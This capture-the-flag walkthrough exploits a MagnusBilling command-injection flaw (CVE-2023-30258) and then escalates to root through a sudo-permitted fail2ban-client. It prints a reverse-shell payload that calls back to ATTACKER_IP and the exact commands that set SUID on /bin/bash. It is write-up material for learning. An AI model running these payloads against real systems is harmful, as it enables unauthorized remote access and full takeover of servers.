
### 1. Vulnerability Discovery: CVE-2023-30258

The process began by identifying a **Critical Remote Code Execution (RCE)** vulnerability in **MagnusBilling 6.x and 7.x** using nuclei. The analysis of the provided Nuclei template revealed that the `/mbilling/lib/icepay/icepay.php` endpoint was vulnerable to **Command Injection** via the `democ` GET parameter.

The vulnerability exists because the application fails to sanitize input before passing it to a system shell. This allows an unauthenticated attacker to append arbitrary OS commands using shell separators like `;`.

### 2. Initial Access: The Reverse Shell

By leveraging the command injection, we bypassed authentication entirely. To gain a foothold, we injected a command to force the server to connect back to our attack machine:

- **Trigger**: A payload like `?democ=test;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;#` was sent.
- **Result**: The server executed the bash command, providing an interactive shell as the `asterisk` user. This provided access to the `user.txt` flag in the `/home/magnus` directory.

---

### 3. Privilege Escalation: Misconfigured Sudo

Once inside, system enumeration using `sudo -l` revealed a significant misconfiguration: the `asterisk` user was permitted to run `/usr/bin/fail2ban-client` with **root privileges** without a password.

#### The Fail2Ban Exploitation Path:
`fail2ban` protects services by executing "actions" (like banning IPs). Because we had sudo access to the client, we could reconfigure these actions to execute malicious commands as root:

1. **Identification**: We identified the active jail `asterisk-iptables` and its specific action `iptables-allports-ASTERISK`.
2. **Injection**: We modified the `actionban` property of that jail to change the permissions of the bash binary: `sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban "chmod +s /bin/bash"`
3. **Trigger**: By manually banning a dummy IP (`banip 1.1.1.1`), we forced the `fail2ban` server (running as root) to execute our `chmod` command.

---

### 4. Full System Compromise

The execution of the `actionban` command set the **SUID bit** on `/bin/bash`. This allowed any user to run bash with the effective permissions of its owner (**root**).

- **Elevation**: Running `bash -p` spawned a shell that preserved these root privileges.
- **Final Objective**: With root access confirmed via `whoami`, we navigated to the `/root` directory to capture the `root.txt` flag.

